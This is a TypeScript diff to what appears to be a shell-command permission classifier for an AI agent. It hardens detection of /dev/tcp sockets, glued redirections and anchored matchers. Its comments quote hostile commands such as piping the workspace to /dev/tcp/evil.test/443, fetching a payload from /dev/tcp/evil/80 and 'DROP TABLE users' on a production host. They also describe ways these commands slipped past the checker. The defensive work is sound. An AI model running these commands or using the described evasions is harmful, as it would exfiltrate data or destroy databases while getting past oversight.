@@ -15,6 +15,7 @@ import {
   isDevPath,
   isDiscardDevice,
   isNetworkDevice,
+  networkDevice,
   lexicalPath,
   chdirPath,
   openedPath,
@@ -1666,7 +1667,9 @@ function joinWords(words: readonly string[]): string {
 }
 
 function normalizeSegmentInner(segment: string): string[] {
-  let s = segment.trim();
+  // A redirection ends the word in front of it, whether or not the author left a space (see separateGluedRedirections):
+  // every matcher below reads the words of THIS text
+  let s = separateGluedRedirections(segment.trim());
   // `npx --package=<spec> -c "<benign>"` FETCHES and runs that package; the command after `-c` is a decoy, and
   // every layer below treats `npx` as transparent and `-c` as a carrier, so the acquisition vanished entirely.
   // A runner carrying `--package`/`-p` is NOT transparent: the head survives so the vocabulary can classify it.
@@ -1707,6 +1710,13 @@ function normalizeSegmentInner(segment: string): string[] {
   // remote side the command's INPUT — `cat 0< /dev/tcp/evil/80 > payload.sh` fetches a file EGO never read.
   for (const nm of s.matchAll(/\/dev\/(tcp|udp)\/([^/\s'"]+)\/([^/\s'"]+)/g))
     extra.push(`${MARK}net-redirect ${nm[1]} ${nm[2]} ${nm[3]}`);
+  // ...and the socket is the name the SHELL sees, so it is also read from the redirection's own target, with its quotes and
+  // escapes removed: `cat < /dev/"tcp"/evil.test/80` has no `/dev/tcp/` in its text, and bash opens one all the same (r11-200)
+  for (const target of scanRedirections(s).sockets) {
+    const nd = networkDevice(target);
+    const marker = nd === null ? null : `${MARK}net-redirect ${nd.proto} ${nd.host} ${nd.port}`;
+    if (marker !== null && !extra.includes(marker)) extra.push(marker);
+  }
   // Assignments that SELECT THE TARGET of a database or Kubernetes client are not noise: stripping them made
   // `PGHOST=prod-db psql -c "DROP TABLE users"` read as the local socket (round 14). They are re-attached below so
   // the target resolver sees them, and are judged nowhere else.
@@ -2183,8 +2193,12 @@ function normalizeTail(rest: string[]): string[] {
       return [`${head} <<<`, ...splitShellSegments(unquoteShellWord(rest[hereIdx + 1]!)).flatMap(normalizeSegment)];
     // `bash < script.sh` RUNS script.sh — the redirection names the program exactly as an operand would, and
     // reading it as an unclassified option left a workspace script unanalysed (exit review 5).
+    // ...but only when nothing else IS the program: `sh run.sh </dev/null` runs run.sh, with stdin as its DATA, and reading the
+    // redirection as the program dropped the script that was named (closure audit, cause-S)
     const fromFile = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(rest.join(' '));
-    if (fromFile && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
+    // (a redirection and its target are not operands: `bash < run.sh` has none)
+    const programOperands = operandAt.filter((at) => !/^\d*(?:<|>|>>|&>|<>|>\||>&)$/.test(rest[at - 1] ?? '') && !/^\d*(?:<|>|&>)/.test(rest[at]!));
+    if (fromFile && programOperands.length === 0 && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
   }
   // `trap 'CMD' EXIT` stores CMD and the shell runs it later: it is a carrier exactly like `sh -c`, and an
   // absolute core deny inside its quoted argument reached ASK (exit review 4).
@@ -2454,12 +2468,41 @@ export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: 
   return { rest: tokens, extra };
 }
 
-/** Output redirection targets of a segment (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs and fd dups excluded. */
-function scanRedirections(segment: string): { writes: string[]; reads: string[] } {
+/** What the ONE reader of redirections found in a segment. */
+interface RedirectionScan {
+  /** Output redirection targets (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs, fd dups, discard devices and
+   *  sockets excluded. */
+  writes: string[];
+  /** the files an input redirection (`< FILE`) reads */
+  reads: string[];
+  /** the sockets a redirection opens (`/dev/tcp/HOST/PORT`), in either direction, as the word the shell sees: a quote in
+   *  `/dev/"tcp"/h/80` is removed before bash looks at the name (r11-200) */
+  sockets: string[];
+  /** where each redirection operator begins in the text that was scanned: a descriptor digit before it is not part of
+   *  it, and `<<`, `<<<` and `<&` are operators too. An operator that stands against the end of a word is where that
+   *  word ends (see separateGluedRedirections) */
+  operators: number[];
+  /** the extent of each redirection that names a word (`>/dev/null`, `2>&1`, `< in.txt`): from its operator to the end of
+   *  that word, in the text that was scanned. A here-document and a here-string are not here: their word is the command's
+   *  input, and the carriers read it */
+  spans: Array<[number, number]>;
+}
+
+/** THE READER OF A SEGMENT'S REDIRECTIONS - one tokenizer for the words that carry them, asked by the redirection targets
+ *  (the writes and reads the path rules judge), the socket detector (the network rule), and the word splitter that ends a
+ *  word at the operator glued to it. The questions used to be answered by three readers of their own: a regular expression
+ *  over the raw text for `/dev/tcp` (which a quote inside the name defeated), `commandWords` for the head of the command
+ *  (which sees `-delete>/dev/null` as two words) and the normalizer, which tokenized on white space only and so kept
+ *  `-delete>/dev/null` as ONE, and no matcher that needs a word boundary after a flag matched it (r11-6, r11-7).
+ *  `keepContinuations` leaves a backslash-newline where it stands, for the caller that wants the offsets of the text it gave. */
+function scanRedirections(segment: string, keepContinuations = false): RedirectionScan {
   const out: string[] = [];
   const reads: string[] = [];
+  const sockets: string[] = [];
+  const operators: number[] = [];
+  const spans: Array<[number, number]> = [];
   // a backslash-newline continuation is erased by the shell before it opens the file, so erase it first too
-  const t = segment.replace(/\\\r?\n/g, '');
+  const t = keepContinuations ? segment : segment.replace(/\\\r?\n/g, '');
   // THE SCAN IS QUOTE-AWARE. A `>` inside a quoted argument is text - `git commit -m "docs: why > control-plane/x.md is
   // refused"` writes nothing - and a regex over the whole segment could not tell (exit review 10). Quotes, escapes,
   // substitutions and process substitutions are skipped as the units they are; the operator is recognised only at
@@ -2507,6 +2550,8 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
     }
     // an INPUT redirection reads a file: `mysql </tmp/payload` feeds it a script. (`<<` and `<<<` carry text, `<(` a command.)
     if (c === '<' && t[i + 1] !== '<' && t[i + 1] !== '(' && t[i + 1] !== '>' && t[i + 1] !== '&') {
+      // (the second and third `<` of `<<` and `<<<` come through here as well; the operator began at the first)
+      if (t[i - 1] !== '<') operators.push(i);
       let k = i + 1;
       while (k < t.length && isIfs(t[k]!)) k++;
       const st = k;
@@ -2522,10 +2567,13 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
         } else k++;
       }
       const w = t.slice(st, Math.min(k, t.length));
+      if (t[i - 1] !== '<') spans.push([i, Math.min(k, t.length)]);
       if (w) {
         const src = unquoteShellWord(w);
+        // `cat < /dev/tcp/HOST/PORT` makes the remote side the command's INPUT: judged by the network, not as a file
+        if (isNetworkDevice(src)) sockets.push(src);
         // a device NAME is not file content, but an open descriptor above 2 (`/dev/fd/3`) is whatever an earlier line opened
-        if (!src.startsWith('&') && !(isDevPath(src) && descriptorAlias(src) === null)) reads.push(src);
+        else if (!src.startsWith('&') && !(isDevPath(src) && descriptorAlias(src) === null)) reads.push(src);
       }
       i = Math.max(k, i + 1);
       continue;
@@ -2545,10 +2593,14 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
       if (t[j] === '>') j++;
       if (t[j] === '|') j++;
     } else if (c === '<' && t[i + 1] === '>') j = i + 2;
+    // `<<`, `<<<` and `<&` carry text or a descriptor and name no file here, but they are operators: the word in front of
+    // them ends where they begin
+    if (j < 0 && c === '<' && (t[i + 1] === '<' || t[i + 1] === '&') && t[i - 1] !== '<') operators.push(i);
     if (j < 0) {
       i++;
       continue;
     }
+    operators.push(i);
     while (j < t.length && isIfs(t[j]!)) j++;
     // the target word: quoted and unquoted chunks, up to the shell's own separators
     const start = j;
@@ -2570,6 +2622,7 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
       } else j++;
     }
     const word = t.slice(start, Math.min(j, t.length));
+    spans.push([i, Math.min(j, t.length)]);
     i = Math.max(j, i + 1);
     if (!word) continue;
     const target = unquoteShellWord(word);
@@ -2580,10 +2633,61 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
     // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
     // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
     // anywhere on the line (exit review 7)
-    if (isDiscardDevice(target) || isNetworkDevice(target)) continue;
+    if (isNetworkDevice(target)) {
+      sockets.push(target);
+      continue;
+    }
+    if (isDiscardDevice(target)) continue;
     out.push(target);
   }
-  return { writes: out, reads };
+  return { writes: out, reads, sockets, operators, spans };
+}
+
+/** THE COMMAND WITHOUT ITS REDIRECTIONS - what a matcher that describes the ACT should read. `git checkout .` discards the
+ *  working tree and its matcher ends at the end of the line (`\s*$`); a redirection after it (`git checkout . >/dev/null`, or
+ *  glued) is not part of the act, and a matcher that wanted the end of the line did not find it (r11-7). The redirections
+ *  themselves are judged where they belong: the path rules read their targets, the network rule their sockets. A descriptor
+ *  that stands alone in front of an operator (`2>&1`) goes with it. */
+function stripRedirections(text: string): string {
+  if (!/[<>]/.test(text)) return text;
+  const { spans } = scanRedirections(text, true);
+  if (spans.length === 0) return text;
+  let out = text;
+  for (const [from, to] of [...spans].sort((a, b) => b[0] - a[0])) {
+    let start = from;
+    let q = from;
+    while (q > 0 && /[0-9]/.test(out[q - 1]!)) q--;
+    if (q < from && (q === 0 || /[\s;&|({<>]/.test(out[q - 1]!))) start = q;
+    out = `${out.slice(0, start)} ${out.slice(to)}`;
+  }
+  return out.trim();
+}
+
+/** THE WORD IN FRONT OF A REDIRECTION OPERATOR ENDS WHERE THE OPERATOR BEGINS, however little white space the author left. The
+ *  shell reads `find . -delete>/dev/null` as the word `-delete` and a redirection; a reader that tokenizes on white space
+ *  alone read ONE word, `-delete>/dev/null`, and every matcher and every reader of a flag that wants the end of a word after
+ *  it (`-f`, `-delete`, `--force`) found nothing: `find . -type f -delete>/dev/null` and `git checkout -f>/dev/null` were
+ *  ALLOW while the same commands with a space were ASK, and `ls>/dev/null` was an unknown command (r11-6, r11-7). A descriptor
+ *  that stands alone in front of the operator (`2>&1`) belongs to it, and is left where it is. The operators are the
+ *  scanner's own (scanRedirections): quoted, escaped and substituted text is never touched. */
+function separateGluedRedirections(text: string): string {
+  if (!/[<>]/.test(text)) return text;
+  const at = scanRedirections(text, true).operators;
+  if (at.length === 0) return text;
+  let out = text;
+  for (const p of [...at].sort((a, b) => b - a)) {
+    // a here-string's text is the word AFTER its operator: `bash<<<'git push'` is the script `git push`, and the readers of a
+    // here-string take the next word whole, which a glued one is not
+    if (out.startsWith('<<<', p) && p + 3 < out.length && !/\s/.test(out[p + 3]!)) out = `${out.slice(0, p + 3)} ${out.slice(p + 3)}`;
+    const before = out[p - 1];
+    if (before === undefined || /[\s;&|({]/.test(before)) continue;
+    // a run of digits that is a word by itself is the descriptor of this operator: the word ends in front of THEM
+    let q = p;
+    while (q > 0 && /[0-9]/.test(out[q - 1]!)) q--;
+    if (q < p && (q === 0 || /[\s;&|(){}<>]/.test(out[q - 1]!))) continue;
+    out = `${out.slice(0, p)} ${out.slice(p)}`;
+  }
+  return out;
 }
 
 export function redirectionTargets(segment: string): string[] {
@@ -12081,26 +12185,31 @@ function classifyNormalized(
   norm: string,
   state: EffectState,
 ): CapabilityHit[] {
-  let outer: CapabilityHit | null = null;
   const additive: CapabilityHit[] = [];
-  const subject = forgeApiSubject(ctx, norm, state.env);
-  for (const { m, re } of compiled) {
-    if (re.test(subject)) {
+  // THE MATCHERS READ THE SEGMENT, in the order the control plane lists them, and the first one that matches decides what
+  // the segment IS. It is asked of a TEXT, because one text is not the whole truth about a command that carries redirections:
+  // the matchers that describe a WRITE through a redirection need to see the operator, and the matchers that describe the ACT
+  // need not to (see the second view below).
+  const firstMatch = (text: string, collect: boolean): CapabilityHit | null => {
+    const subject = forgeApiSubject(ctx, text, state.env);
+    for (const { m, re } of compiled) {
+      if (!re.test(subject)) continue;
       // An ADDITIVE matcher describes something the segment ALSO does — a write destination — not what it IS.
       // Letting one win first-match terminated classification of the rest: `git clone --template=evil -o up URL`
       // matched the `--output|-o` write matcher, which sits above the `--template` hook-install deny, and a
       // single `-o` turned DENY into ALLOW while the template's hook really executed (exit review 2).
       if (m.additive) {
-        additive.push({
-          capability: m.capability,
-          verdict: verdictFor(table, ctx, m.capability),
-          via: `matcher /${m.command}/`,
-          segment: norm,
-          absolute: isAbsoluteCap(table, m.capability),
-        });
+        if (collect)
+          additive.push({
+            capability: m.capability,
+            verdict: verdictFor(table, ctx, m.capability),
+            via: `matcher /${m.command}/`,
+            segment: norm,
+            absolute: isAbsoluteCap(table, m.capability),
+          });
         continue;
       }
-      outer = retargetLocalCapability(
+      return retargetLocalCapability(
         table,
         ctx,
         upgradeToDbDrop(
@@ -12113,14 +12222,33 @@ function classifyNormalized(
             segment: norm,
             absolute: isAbsoluteCap(table, m.capability),
           },
-          norm,
-          state.env.rawSegment ?? norm,
+          text,
+          state.env.rawSegment ?? text,
         ),
-        norm,
+        text,
         state.env.envInputs,
-        state.env.rawSegment ?? norm,
+        state.env.rawSegment ?? text,
       );
-      break;
+    }
+    return null;
+  };
+  let outer = firstMatch(norm, true);
+  // THE ACT IS READ WITHOUT ITS REDIRECTIONS TOO. `git checkout .` is the matcher `…(\.|\*)\s*$`; the same command followed by
+  // `>/dev/null` - glued or spaced - ends in a redirection, and no matcher that wants the end of the line found it: ASK became
+  // ALLOW for every governed command whose matcher is anchored (r11-7: 23 of ~110 flipped). The redirection is not part of
+  // the act; the path rules judge where it writes and the network rule where it connects. This view can only RAISE the answer:
+  // a matcher of the text WITH the operator (a write into a protected tree) was already asked, and keeps winning when it is
+  // the stricter.
+  if (/[<>]/.test(norm)) {
+    const plain = stripRedirections(norm);
+    if (plain !== norm && plain !== '') {
+      const second = firstMatch(plain, false);
+      const floor = outer ?? { verdict: verdictFor(table, ctx, 'command.unknown'), absolute: false };
+      if (
+        second !== null &&
+        (VERDICT_RANK[second.verdict] > VERDICT_RANK[floor.verdict] || (VERDICT_RANK[second.verdict] === VERDICT_RANK[floor.verdict] && second.absolute && !floor.absolute))
+      )
+        outer = second;
     }
   }
   // A NETWORK TOOL IS JUDGED BY WHAT IT SENDS AND TO WHOM: the name alone made a download and a PUT that merges a pull
@@ -14094,7 +14222,7 @@ function analyzeSegments(
     // scan, pathTokens, the short-flag cluster reader and every producer. The shell does it ahead of everything
     // else, so a reader given the unexpanded text is reading a word that will never exist (exit review 9).
     const braceOverflow = { hit: false };
-    const seg = substituteKnownVars(expandBraces(stage.text, braceOverflow), shellVars);
+    const seg = separateGluedRedirections(substituteKnownVars(expandBraces(stage.text, braceOverflow), shellVars));
     // WHAT IS BOUND HERE, and whether what THIS stage assigns or defines certainly takes place in the shell that goes on:
     // not inside a branch (`if`/`while`/`for`/`case`, `time if false`), a function body, a case arm (the splitter consumes
     // its header), either side of a pipe - a definition is the stage after the whole BODY of `git() { echo hi; } | cat` -,
